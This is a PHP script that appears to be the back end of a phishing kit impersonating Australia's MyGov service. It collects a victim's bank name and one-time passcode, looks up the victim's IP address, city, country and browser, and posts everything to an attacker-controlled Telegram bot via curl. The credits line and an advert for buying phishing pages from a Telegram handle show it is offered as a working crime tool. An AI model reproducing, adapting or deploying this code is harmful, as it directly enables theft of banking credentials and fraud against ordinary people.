<?php
include 'config.php';
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$response = file_get_contents("https://freeipapi.com/api/json/$ip");
$data = json_decode($response);
$country = $data->countryName;
$city = $data->cityName;
$useragent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser()
{
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown";

    if (strpos($user_agent, 'MSIE') !== FALSE) {
        $browser = 'Internet Explorer';
    } elseif (strpos($user_agent, 'Firefox') !== FALSE) {
        $browser = 'Mozilla Firefox';
    } elseif (strpos($user_agent, 'Chrome') !== FALSE) {
        $browser = 'Google Chrome';
    } elseif (strpos($user_agent, 'Safari') !== FALSE) {
        $browser = 'Safari';
    } elseif (strpos($user_agent, 'Opera') !== FALSE) {
        $browser = 'Opera';
    }

    return $browser;
}
$browser = getBrowser();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the password from the form
    $aa = $_POST['username'] ?? '';
    $cc = $_POST['title'] ?? '';
    $message .= "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
	$message .= "|Bank Name: ".$cc."\n";
	$message .= "|OTP-Code: ".$aa."\n";
	$message .= "|+++++++++++++|   Information   |+++++++++++++++|\n";
	$message .= "|Client IP: ".$ip."\n";
    $message .= "|City : ".$city."\n";
	$message .= "|Country : ".$country."\n";
    $message .= "|UserAgent : ".$useragent."\n";
	$message .= "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
	$message .= "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
    // API endpoint for sending messages to the bot
    $telegramApiEndpoint = "https://api.telegram.org/bot$apikey/sendMessage";
    $data = [
        'chat_id' => $chatid,
        'text' => $message
    ];

    // Initialize cURL session
    $ch = curl_init($telegramApiEndpoint);

    // Set cURL options
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute the cURL request
    $response = curl_exec($ch);

    // Check for errors
    if ($response === false) {
        // Log any cURL errors
        $error = curl_error($ch);
        error_log("cURL Error: $error");
    }
    curl_close($ch);

}

else{
    $jsonString = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';

    // Decode JSON string into a PHP associative array
    $data = json_decode($jsonString, true);
    
    // Access the value of the "key" and echo it
    echo $data['key']; // This will output: value};
};
?>
